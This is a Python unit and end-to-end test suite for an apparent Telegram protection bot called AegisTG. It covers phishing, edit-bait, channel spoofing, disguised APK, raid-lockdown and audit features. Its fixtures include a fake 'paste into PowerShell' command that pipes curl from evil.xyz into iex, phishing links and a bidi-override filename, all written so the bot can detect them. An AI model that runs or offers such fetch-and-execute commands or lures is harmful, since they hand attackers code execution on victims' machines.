"""Comprehensive Unit & End-to-End Test Suite for AegisTG Telegram Protector."""

from __future__ import annotations

import asyncio
import io
import time
import unittest
import zipfile
from typing import Any

from PIL import Image, ImageDraw

from protector.analyzers.media_guard import compute_dhash, hamming_distance
from protector.auditor import SecurityAuditor
from protector.bot import AegisTGBot
from protector.config import load_config
from protector.engine import ProtectionEngine
from protector.models import (
    ChatConfig,
    ChatType,
    EntityInfo,
    EventType,
    MediaInfo,
    RaidState,
    TelegramEvent,
    ThreatCategory,
    VerdictAction,
)
from protector.normalizer import normalize_text, redact_pii
from protector.simulate import run_simulation
from protector.storage import Storage
from protector.telegram_client import TelegramAPIClient


def _synthetic_png(bg: tuple[int, int, int], shift: int = 0) -> bytes:
    img = Image.new("RGB", (128, 96), color=bg)
    draw = ImageDraw.Draw(img)
    draw.rectangle([10 + shift, 10, 118 - shift, 38], fill=(250, 210, 20))
    draw.ellipse([36, 44, 92, 88], fill=(25, 45, 190))
    draw.line([0, 96, 128, 0], fill=(255, 255, 255), width=3)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _fake_apk_zip_bytes() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("AndroidManifest.xml", "<manifest/>")
        zf.writestr("classes.dex", b"dex\n035\x00")
    return buf.getvalue()


class MockTelegramClient(TelegramAPIClient):
    """In-memory mock Telegram API client recording all moderation calls."""

    def __init__(self, rate_limits: Any = None) -> None:
        super().__init__(bot_token="123456:TEST_TOKEN", rate_limits=rate_limits)
        self.calls: list[tuple[str, dict[str, Any]]] = []
        self.admins_by_chat: dict[int, list[dict[str, Any]]] = {}
        self.chat_info_by_chat: dict[int, dict[str, Any]] = {}

    async def call(
        self,
        method: str,
        payload: dict[str, Any] | None = None,
        timeout: float = 20.0,
        chat_id: int | None = None,
        is_outbound_message: bool = False,
    ) -> Any:
        clean = {k: v for k, v in (payload or {}).items() if v is not None}
        self.calls.append((method, clean))
        if method == "getMe":
            return {"id": 999000, "is_bot": True, "username": "AegisTGTestBot"}
        if method == "getChatAdministrators":
            return self.admins_by_chat.get(int(clean["chat_id"]), [])
        if method == "getChat":
            cid = int(clean["chat_id"])
            return self.chat_info_by_chat.get(
                cid,
                {
                    "id": cid,
                    "type": "supergroup",
                    "title": "Test Group",
                    "permissions": {
                        "can_send_messages": True,
                        "can_send_photos": True,
                        "can_add_web_page_previews": False,
                    },
                },
            )
        return True


class TestNormalizer(unittest.TestCase):
    def test_zero_width_and_cyrillic_homoglyphs(self) -> None:
        # 'а', 'е', 'о' are Cyrillic confusables + zero-width spaces
        raw = "T\u200bеlеgr\u200bаm \u200bаccоunt vеrify"
        norm = normalize_text(raw)
        self.assertEqual(norm.folded_ascii, "telegram account verify")
        self.assertGreaterEqual(norm.invisible_count, 3)
        self.assertGreaterEqual(norm.mixed_script_tokens, 2)
        self.assertGreaterEqual(norm.obfuscation_score, 30)

    def test_bidi_override_flagged_high(self) -> None:
        norm = normalize_text("invoice_\u202efdp.exe")
        self.assertEqual(norm.bidi_override_count, 1)
        self.assertGreaterEqual(norm.obfuscation_score, 35)

    def test_bengali_legitimate_text_not_penalized(self) -> None:
        # Legitimate Bengali text with conjuncts/ZWJ should have zero obfuscation score
        bn = "বাংলাদেশের প্রোগ্রামার কমিউনিটিতে স্বাগতম! আজকের ক্লাস রাত ৯টায়।"
        norm = normalize_text(bn)
        self.assertEqual(norm.obfuscation_score, 0)
        self.assertIn("বাংলাদেশের", norm.cleaned)

    def test_pii_redaction(self) -> None:
        text = "Contact john.doe@example.com or +8801712345678 card 4532 0151 1283 0366"
        red = redact_pii(text)
        self.assertIn("[REDACTED_EMAIL]", red)
        self.assertIn("[REDACTED_PHONE]", red)
        self.assertIn("[REDACTED_CARD]", red)
        self.assertNotIn("john.doe@example.com", red)


class TestProtectionEngine(unittest.IsolatedAsyncioTestCase):
    def setUp(self) -> None:
        self.cfg = load_config()
        self.storage = Storage(":memory:")
        self.engine = ProtectionEngine(self.cfg, self.storage)
        self.group_id = -100111222333
        self.channel_id = -100444555666
        self.storage.upsert_chat_config(
            ChatConfig(
                chat_id=self.group_id,
                chat_type="supergroup",
                title="Protected Group",
                linked_parent_channel_id=self.channel_id,
            )
        )
        self.storage.upsert_chat_config(
            ChatConfig(
                chat_id=self.channel_id,
                chat_type="channel",
                title="Protected Channel",
                strict_channel_guard=True,
            )
        )

    def tearDown(self) -> None:
        self.storage.close()

    async def test_hard_block_csam_and_fedban_propagation(self) -> None:
        ev = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=1000.0,
            message_id=1,
            user_id=555001,
            text="Fresh cp links vip mega pack join now",
        )
        res = await self.engine.evaluate(ev)
        self.assertEqual(res.action, VerdictAction.HARD_BLOCK_FEDBAN)
        self.assertEqual(res.primary_category, ThreatCategory.CSAM_EXPLOITATION)
        self.assertTrue(res.federation_ban)

        # Same user enters a completely different chat in the federation -> instant block even with benign text!
        ev2 = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=-100999888111,
            chat_type=ChatType.SUPERGROUP,
            timestamp=1005.0,
            message_id=2,
            user_id=555001,
            text="Hello!",
        )
        res2 = await self.engine.evaluate(ev2)
        self.assertEqual(res2.action, VerdictAction.HARD_BLOCK_FEDBAN)
        self.assertEqual(res2.primary_category, ThreatCategory.REPUTATION_FEDBAN)

    async def test_delayed_edit_bait_sabotage(self) -> None:
        t0 = 10_000.0
        # 1. Innocent original message
        orig = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=t0,
            message_id=42,
            user_id=666001,
            username="sleeper",
            text="Really enjoyed reading this tutorial, thank you!",
        )
        r1 = await self.engine.evaluate(orig)
        self.assertEqual(r1.action, VerdictAction.ALLOW)

        # 2. Edited 2 hours later to inject a shortener phishing URL
        edited = TelegramEvent(
            event_type=EventType.EDITED_MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=t0 + 7200.0,
            original_date=t0,
            edit_date=t0 + 7200.0,
            message_id=42,
            user_id=666001,
            username="sleeper",
            text="Claim free airdrop instantly here https://bit.ly/claim-ton-now",
        )
        r2 = await self.engine.evaluate(edited)
        self.assertIn(
            r2.action,
            {VerdictAction.DELETE_RESTRICT, VerdictAction.DELETE_BAN, VerdictAction.HARD_BLOCK_FEDBAN},
        )
        self.assertTrue(any(s.category == ThreatCategory.EDIT_BAIT_SABOTAGE for s in r2.signals))

    async def test_sender_chat_spoofing_vs_legitimate_parent_channel(self) -> None:
        # Legitimate auto-forward from linked parent channel -> ALLOWED
        legit = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=2000.0,
            message_id=50,
            sender_chat_id=self.channel_id,
            sender_chat_title="Protected Channel",
            text="Official weekly digest is out!",
        )
        r_legit = await self.engine.evaluate(legit)
        self.assertEqual(r_legit.action, VerdictAction.ALLOW)

        # Rogue external channel spoofing -> BAN SENDER CHAT
        spoof = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=2005.0,
            message_id=51,
            sender_chat_id=-100777777777,
            sender_chat_title="PUMP SIGNALS 100X",
            text="Check my profile!",
        )
        r_spoof = await self.engine.evaluate(spoof)
        self.assertTrue(r_spoof.ban_sender_chat)
        self.assertEqual(r_spoof.action, VerdictAction.DELETE_BAN)

    async def test_media_guard_apk_zip_and_perceptual_dhash_and_viral_wave(self) -> None:
        # 1. Hidden APK disguised as .zip document
        ev_apk = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=3000.0,
            message_id=60,
            user_id=777001,
            media=MediaInfo(
                media_type="document",
                file_name="notes.zip",
                mime_type="application/zip",
                raw_bytes=_fake_apk_zip_bytes(),
            ),
        )
        res_apk = await self.engine.evaluate(ev_apk)
        self.assertEqual(res_apk.action, VerdictAction.HARD_BLOCK_FEDBAN)
        self.assertEqual(res_apk.primary_category, ThreatCategory.MALWARE_EXPLOIT)

        # 2. Perceptual dHash matching on slightly mutated scam image
        base_img = _synthetic_png((180, 20, 20), shift=0)
        mutated_img = _synthetic_png((175, 25, 25), shift=2)
        h1 = compute_dhash(base_img)
        h2 = compute_dhash(mutated_img)
        assert h1 is not None and h2 is not None
        self.assertLessEqual(hamming_distance(h1, h2), 8)
        self.storage.add_banned_media_hash(h1, "SCAM_PHISHING_SAFEGUARD", "Banned scam flyer")

        ev_img = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=3010.0,
            message_id=61,
            user_id=777002,
            media=MediaInfo(media_type="photo", raw_bytes=mutated_img),
        )
        res_img = await self.engine.evaluate(ev_img)
        self.assertEqual(res_img.action, VerdictAction.HARD_BLOCK_FEDBAN)

        # 3. Zero-day Viral Raid Flyer Wave (3 unseen distinct users posting identical brand-new flyer)
        fresh_flyer = _synthetic_png((10, 120, 60), shift=0)
        last_res = None
        for idx in range(3):
            ev_wave = TelegramEvent(
                event_type=EventType.MESSAGE,
                chat_id=self.group_id,
                chat_type=ChatType.SUPERGROUP,
                timestamp=4000.0 + idx,
                message_id=70 + idx,
                user_id=888000 + idx,
                media=MediaInfo(media_type="photo", raw_bytes=fresh_flyer),
            )
            last_res = await self.engine.evaluate(ev_wave)
        assert last_res is not None
        self.assertIn(last_res.action, {VerdictAction.DELETE_BAN, VerdictAction.HARD_BLOCK_FEDBAN})

    async def test_raid_state_machine_lockdown_and_cooldown(self) -> None:
        t0 = 50_000.0
        triggered = False
        state = RaidState.NORMAL
        for i in range(self.cfg.raid.lockdown_joins_threshold):
            state, trig = self.engine.behavioral.record_join(self.group_id, t0 + i * 0.5)
            triggered = triggered or trig
        self.assertEqual(state, RaidState.LOCKDOWN)
        self.assertTrue(triggered)

        # After lockdown cooldown passes quietly, drops to ELEVATED, then NORMAL
        after_lockdown = self.engine.behavioral.get_raid_state(
            self.group_id, t0 + 100 + self.cfg.raid.lockdown_cooldown_seconds + 5
        )
        self.assertEqual(after_lockdown, RaidState.ELEVATED)

    async def test_channel_strict_quarantine_and_draft_check(self) -> None:
        # Channel post from hijacked admin -> QUARANTINE_CHANNEL_POST
        post = TelegramEvent(
            event_type=EventType.CHANNEL_POST,
            chat_id=self.channel_id,
            chat_type=ChatType.CHANNEL,
            timestamp=6000.0,
            message_id=900,
            is_admin=True,
            text="Verify your Telegram account immediately or it will be banned: https://telegram-verify.com/login",
        )
        res = await self.engine.evaluate(post)
        self.assertEqual(res.action, VerdictAction.QUARANTINE_CHANNEL_POST)
        self.assertTrue(res.alert_owner)

        # Clean channel announcement -> ALLOW
        clean = TelegramEvent(
            event_type=EventType.CHANNEL_POST,
            chat_id=self.channel_id,
            chat_type=ChatType.CHANNEL,
            timestamp=6010.0,
            message_id=901,
            is_admin=True,
            text="New tutorial published at https://github.com/python/cpython — enjoy!",
        )
        res_clean = await self.engine.evaluate(clean)
        self.assertEqual(res_clean.action, VerdictAction.ALLOW)

    async def test_red_team_simulation_100_percent_pass(self) -> None:
        sim_results, audit_score = await run_simulation()
        self.assertEqual(len(sim_results), 15)
        for r in sim_results:
            self.assertEqual(
                r.blocked,
                r.expected_block,
                f"Scenario '{r.name}' failed: expected_block={r.expected_block}, got {r.action} (score={r.risk_score})",
            )
        self.assertEqual(audit_score, 100)


class TestAuditorAndBotEndToEnd(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self) -> None:
        self.cfg = load_config()
        self.cfg.download_media_for_inspection = False
        self.cfg.rate_limits.delete_batch_window_ms = 20
        self.storage = Storage(":memory:")
        self.mock_client = MockTelegramClient(rate_limits=self.cfg.rate_limits)
        self.bot = AegisTGBot(self.cfg, storage=self.storage, client=self.mock_client)
        await self.bot.initialize()

    async def asyncTearDown(self) -> None:
        self.storage.close()

    async def test_auditor_flags_unprotected_linked_group_critical(self) -> None:
        auditor = SecurityAuditor(self.storage)
        report = auditor.audit_chat_metadata(
            chat_info={
                "id": -100555,
                "type": "channel",
                "title": "Main Channel",
                "linked_chat_id": -100666,  # NOT registered in storage!
                "has_protected_content": False,
            },
            admins=[
                {"status": "creator", "user": {"id": 1, "is_bot": False}},
                {"status": "administrator", "user": {"id": 2, "is_bot": False}, "can_promote_members": True},
                {
                    "status": "administrator",
                    "user": {"id": self.bot.bot_user_id, "is_bot": True},
                    "can_delete_messages": True,
                    "can_post_messages": True,
                    "can_edit_messages": True,
                },
            ],
            bot_user_id=self.bot.bot_user_id,
            chat_cfg=self.storage.get_chat_config(-100555),
        )
        self.assertLess(report.score, 65)
        self.assertTrue(
            any(f.check_id == "linked_group_parity" and f.severity == "CRITICAL" for f in report.findings)
        )

    async def test_bot_end_to_end_phishing_lockdown_unlock_and_join_request(self) -> None:
        chat_id = -100123456
        admin_id = 10001
        self.mock_client.admins_by_chat[chat_id] = [
            {"status": "creator", "user": {"id": admin_id, "is_bot": False}},
            {
                "status": "administrator",
                "user": {"id": self.bot.bot_user_id, "is_bot": True},
                "can_delete_messages": True,
                "can_restrict_members": True,
                "can_invite_users": True,
            },
        ]

        # 1. Attacker sends Fake Safeguard RCE scam -> deleted + banned + fed-banned
        res = await self.bot.handle_update(
            {
                "update_id": 1,
                "message": {
                    "message_id": 500,
                    "date": int(time.time()),
                    "chat": {"id": chat_id, "type": "supergroup", "title": "Devs"},
                    "from": {"id": 999111, "is_bot": False, "first_name": "Evil"},
                    "text": "Press Win+R and paste into PowerShell: curl https://evil.xyz/x | iex",
                },
            }
        )
        assert res is not None
        self.assertEqual(res.action, VerdictAction.HARD_BLOCK_FEDBAN)
        # Allow 150ms coalesced delete flush
        await asyncio.sleep(0.06)
        methods = [m for m, _ in self.mock_client.calls]
        self.assertIn("deleteMessage", methods)
        self.assertIn("banChatMember", methods)

        # 2. Same fed-banned user attempts ChatJoinRequest -> automatically declined!
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 2,
                "chat_join_request": {
                    "chat": {"id": chat_id, "type": "supergroup", "title": "Devs"},
                    "from": {"id": 999111, "is_bot": False, "first_name": "Evil"},
                    "date": int(time.time()),
                    "user_chat_id": 999111,
                },
            }
        )
        self.assertIn("declineChatJoinRequest", [m for m, _ in self.mock_client.calls])

        # 3. Admin triggers /lockdown then /unlock -> permissions saved & restored!
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 3,
                "message": {
                    "message_id": 501,
                    "date": int(time.time()),
                    "chat": {"id": chat_id, "type": "supergroup", "title": "Devs"},
                    "from": {"id": admin_id, "is_bot": False, "first_name": "Admin"},
                    "text": "/lockdown",
                },
            }
        )
        self.assertIn("setChatPermissions", [m for m, _ in self.mock_client.calls])
        self.assertEqual(self.storage.get_chat_config(chat_id).raid_state, RaidState.LOCKDOWN.value)

        await self.bot.handle_update(
            {
                "update_id": 4,
                "message": {
                    "message_id": 502,
                    "date": int(time.time()),
                    "chat": {"id": chat_id, "type": "supergroup", "title": "Devs"},
                    "from": {"id": admin_id, "is_bot": False, "first_name": "Admin"},
                    "text": "/unlock",
                },
            }
        )
        self.assertEqual(self.storage.get_chat_config(chat_id).raid_state, RaidState.NORMAL.value)

        # 4. Appeal Forensics Pack contains the blocked incident & /purge_chat_data erases it cleanly
        pack = self.bot.auditor.build_appeal_forensics_pack(chat_id, days=30)
        self.assertGreaterEqual(pack["summary_metrics"]["total_incidents"], 1)
        self.storage.purge_chat_data(chat_id)
        pack_after = self.bot.auditor.build_appeal_forensics_pack(chat_id, days=30)
        self.assertEqual(pack_after["summary_metrics"]["total_incidents"], 0)

    async def test_coalesced_batch_delete_messages(self) -> None:
        chat_id = -100777888
        self.mock_client.calls.clear()
        for mid in (10, 11, 12, 13, 14):
            await self.mock_client.queue_delete_message(chat_id, mid)
        await asyncio.sleep(0.06)
        delete_calls = [(m, p) for m, p in self.mock_client.calls if m in {"deleteMessage", "deleteMessages"}]
        self.assertEqual(len(delete_calls), 1)
        self.assertEqual(delete_calls[0][0], "deleteMessages")
        self.assertEqual(delete_calls[0][1]["message_ids"], [10, 11, 12, 13, 14])


if __name__ == "__main__":
    unittest.main()
